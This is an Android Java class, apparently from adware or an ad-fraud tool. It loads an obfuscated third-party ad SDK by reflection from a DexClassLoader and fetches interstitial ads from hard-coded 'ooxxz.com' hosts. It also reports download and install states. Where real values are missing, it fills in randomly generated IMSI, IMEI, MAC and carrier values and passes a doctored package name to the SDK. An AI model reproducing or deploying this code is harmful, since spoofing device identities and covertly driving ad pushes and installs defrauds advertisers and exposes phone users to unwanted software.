package ad.jz;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import ad.L;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class AdHelper {
	public static final String TAG = AdHelper.class.getSimpleName();
	public static final String PACKAGE_BASE = "jl.ryj.rfkr.hjwt.";
	public static final String[] sUrls = new String[] { "http://bz.ooxxz.com/",
			"http://bz1.ooxxz.com/", "http://bz2.ooxxz.com/" };
	public static String APPID = "";

	public static String getAds(Context context, DexClassLoader dcl, String adId) {
		try {
			Class cls_DownloadTaskManager = dcl.loadClass(PACKAGE_BASE + "y");
			Method m_getDtManagerInstance = cls_DownloadTaskManager
					.getDeclaredMethod("a", Context.class);
			m_getDtManagerInstance.setAccessible(true);
			Object obj_manager = m_getDtManagerInstance.invoke(null, context);

			Class cls_IDecode = dcl.loadClass(PACKAGE_BASE + "x");
			Class cls_DownloadTask = dcl.loadClass(PACKAGE_BASE + "z");
			Method m_startTask = cls_DownloadTask.getDeclaredMethod("a",
					String.class, String.class, String.class, String.class);
			m_startTask.setAccessible(true);
			Constructor cons_DownloadTask = cls_DownloadTask
					.getDeclaredConstructor(cls_DownloadTaskManager,
							String.class, String.class, String.class,
							cls_IDecode);
			cons_DownloadTask.setAccessible(true);

			Object obj_Task = cons_DownloadTask.newInstance(obj_manager, "3",
					adId, "chaping", null);

			for (int i = 0; i < sUrls.length; i++) {
				String result = (String) m_startTask.invoke(obj_Task, "3",
						SpHelper.getLastPushAdId(), "chaping", sUrls[i] + "a");
				if (result != null && !"".equals(result)) {
					Log.e("lkt", result);
					return result;
				}
				Thread.sleep(2000);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	public static void fillNecessaryInfo(Context context) {
		try {
			DexClassLoader dcl = JzEntry.getDexClassLoader(context);
			Class cls_Params = dcl.loadClass(PACKAGE_BASE + "r");
			Method m_getInstance = cls_Params.getDeclaredMethod("a",
					Context.class);
			m_getInstance.setAccessible(true);
			Object obj_Params = m_getInstance.invoke(null, context);

			Field f_Imsi = cls_Params.getDeclaredField("x");// imsi
			Field f_Carrier = cls_Params.getDeclaredField("w");
			f_Imsi.setAccessible(true);
			f_Carrier.setAccessible(true);
			Object imsiObj = f_Imsi.get(obj_Params);
			if (imsiObj == null || imsiObj.toString().trim().equals("")) {
				String[] imsis = Utils.getRandomIMSIAndCarrier();
				// imsi
				f_Imsi.set(obj_Params, imsis[0]);
				// carrier
				f_Carrier.set(obj_Params, imsis[1]);
			}
			// appId
			Field f_AppId = cls_Params.getDeclaredField("r");
			f_AppId.setAccessible(true);
			f_AppId.set(obj_Params, APPID);

			Field f_PackageName = cls_Params.getDeclaredField("p");
			f_PackageName.setAccessible(true);
			String pn = context.getPackageName();
			pn = pn.substring(0, 2) + "pp" + pn.substring(2);
			f_PackageName.set(obj_Params, pn);

			// uuid
			Field f_uuid = cls_Params.getDeclaredField("l");
			f_uuid.setAccessible(true);
			Object uuidObj = f_uuid.get(obj_Params);
			if (uuidObj == null || "".equals(uuidObj.toString().trim())) {
				f_uuid.set(obj_Params, Utils.getRandomIMEI());
			}

			// mac
			Field f_mac = cls_Params.getDeclaredField("y");
			f_mac.setAccessible(true);
			Object macObj = f_mac.get(obj_Params);
			if (macObj == null || "".equals(macObj.toString().trim())) {
				f_mac.set(obj_Params, Utils.getRandomMac());
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void updateProvince(Context context) {
		try {
			Class cls_Params = JzEntry.getDexClassLoader(context).loadClass(
					PACKAGE_BASE + "r");
			Method m_getInstance = cls_Params.getDeclaredMethod("a",
					Context.class);
			m_getInstance.setAccessible(true);
			Object obj_Params = m_getInstance.invoke(null, context);

			Field f_locationInfo = cls_Params.getDeclaredField("B");
			f_locationInfo.setAccessible(true);
			f_locationInfo.set(obj_Params, SpHelper.getFormatProvince());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 
	 * @param context
	 * @param adInfo
	 * @param adState
	 *            one of push download install start
	 */
	public static void post(Context context, String adState) {
		L.e(TAG,
				"post state:" + adState + " adId:" + SpHelper.getLastPushAdId());
		DexClassLoader dcl = JzEntry.getDexClassLoader(context);
		try {
			Object obj_adInfo = getAdInfoObj(dcl);

			Class cls_Post = dcl.loadClass(PACKAGE_BASE + "da");
			Constructor cons = cls_Post.getDeclaredConstructor(Context.class,
					dcl.loadClass(PACKAGE_BASE + "b"), String.class);
			cons.setAccessible(true);
			Thread t = (Thread) cons.newInstance(context, obj_adInfo, adState);
			t.start();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static Object getAdInfoObj(DexClassLoader dcl) throws Exception {
		Class cls_AdInfo = dcl.loadClass(PACKAGE_BASE + "b");
		Class[] types = new Class[] { String.class, String.class, String.class,
				String.class, String.class, String.class, String.class,
				String.class, String.class, String.class, String.class,
				String.class, String.class, String.class, boolean.class,
				boolean.class, boolean.class, String.class, String.class,
				String.class, String.class, String.class, String.class,
				String.class, String.class, boolean.class, String.class,
				String.class, String.class, String.class, boolean.class,
				boolean.class };
		Constructor cons = cls_AdInfo.getDeclaredConstructor(types);
		cons.setAccessible(true);
		Object obj = cons.newInstance(null, null, null, null, null, null, null,
				null, null, null, null, null, null, null, false, false, false,
				null, null, null, null, null, null, null, null, false, null,
				null, null, null, false, false);
		Field f_adId = cls_AdInfo.getDeclaredField("b");// adid
		f_adId.setAccessible(true);
		f_adId.set(obj, SpHelper.getLastPushAdId());

		Field f_adType = cls_AdInfo.getDeclaredField("D");// adType
		f_adType.setAccessible(true);
		f_adType.set(obj, "chaping");

		Field f_adType1 = cls_AdInfo.getDeclaredField("C");// adType1
		f_adType1.setAccessible(true);
		f_adType1.set(obj, "");
		return obj;
	}

}
